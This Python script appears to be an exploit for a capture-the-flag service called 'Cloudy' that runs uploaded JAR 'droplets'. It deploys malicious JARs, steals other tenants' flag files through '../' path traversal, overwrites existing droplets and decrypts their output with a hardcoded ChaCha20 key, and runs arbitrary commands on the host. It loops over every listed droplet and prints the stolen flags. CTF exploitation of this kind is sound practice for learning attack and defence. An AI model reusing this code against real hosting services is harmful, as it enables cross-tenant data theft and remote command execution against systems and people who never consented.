import random
import string
from typing import List

from fakesession import FakeSession
from chacha20 import chacha20_encrypt
import os
import sys


class CloudyApi:
    def __init__(self, host: str):
        self.s = FakeSession(host, 2)

    # list droplets, returns list of names
    def list(self):
        r = self.s.get("/api/droplets")
        assert r.status_code == 200, f"Bad response: {r.text}"
        return r.json()

    # get droplet logs
    # {"name": "<name>", "created": "<date>", "logs": ["log1", "log2"]}
    def get(self, name: str):
        r = self.s.get(f"/api/droplets/{name}")
        assert r.status_code == 200, f"Bad response: {r.text}"
        return r.json()

    # upload new droplet
    # jar names: check1, flagstore1
    # returns droplet as in `get`
    def upload(self, name: str, jar_name: str):
        base = os.path.abspath(os.path.dirname(__file__))
        r = self.s.put(f"/api/droplets/{name}", files={
            'file': open(f'{base}/sploit-droplets/{jar_name}/build/libs/{jar_name}-0.0.1-SNAPSHOT.jar', 'rb')
        })
        assert r.status_code == 200, f"Bad response: {r.text}"
        return r.json()

    # execute
    # returns string from droplet
    def execute(self, name: str, arguments: List[str]):
        r = self.s.post(f"/api/droplets/{name}", data={"arguments": arguments})
        assert r.status_code == 200, f"Bad response: {r.text}"
        return r.text


class Droplet:
    def __init__(self, name: str, api: CloudyApi, jar_name: str):
        self.name = name
        self.api = api
        self.jar_name = jar_name

    def is_deployed(self):
        return self.name in self.api.list() and self.api.get(self.name).get("name") == self.name

    def deploy(self):
        droplet = self.api.upload(self.name, self.jar_name)
        assert droplet.get("name") == self.name, "Deploy error"
        assert self.is_deployed(), "Deploy error"

    def logs(self):
        assert self.is_deployed(), "Fetching logs, but droplet not deployed"
        droplet = self.api.get(self.name)
        assert droplet.get("logs") is not None, "Log fetching error"
        return droplet["logs"]

    def execute(self, arguments: List[str]):
        assert self.is_deployed(), "Executing, but droplet not deployed"
        return self.api.execute(self.name, arguments)


class Exploit1(Droplet):
    def __init__(self, name: str, api: CloudyApi):
        super(Exploit1, self).__init__(name, api, "exploit1")

    def load(self, path: str):
        return self.execute([path])

    def get_flag(self, name):
        return self.load(f"../{name}/flag")


class Exploit2(Droplet):
    def __init__(self, name: str, api: CloudyApi):
        super(Exploit2, self).__init__(name, api, "exploit2")

    def get_flag(self):
        encrypted = bytes.fromhex(self.execute(["hack"]))
        flag = chacha20_encrypt(encrypted, (b"secretkey" + b"\x00" * 100)[:32])
        return flag


class Exploit3(Droplet):
    def __init__(self, name: str, api: CloudyApi):
        super(Exploit3, self).__init__(name, api, "exploit3")

    def exec(self, command):
        return self.execute([command])


def rand_string(n=12, alphabet=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(alphabet) for _ in range(n))


if __name__ == '__main__':
    api = CloudyApi(sys.argv[1])
    exploit1 = Exploit1(rand_string(), api)
    exploit1.deploy()
    for droplet in api.list():
        if droplet.startswith("1_"):
            print(exploit1.get_flag(droplet))
        elif droplet.startswith("2_"):
            exploit2 = Exploit2(droplet, api)
            exploit2.deploy()
            print(exploit2.get_flag())
    exploit3 = Exploit3(rand_string(), api)
    exploit3.deploy()
    print(exploit3.exec("calc"))
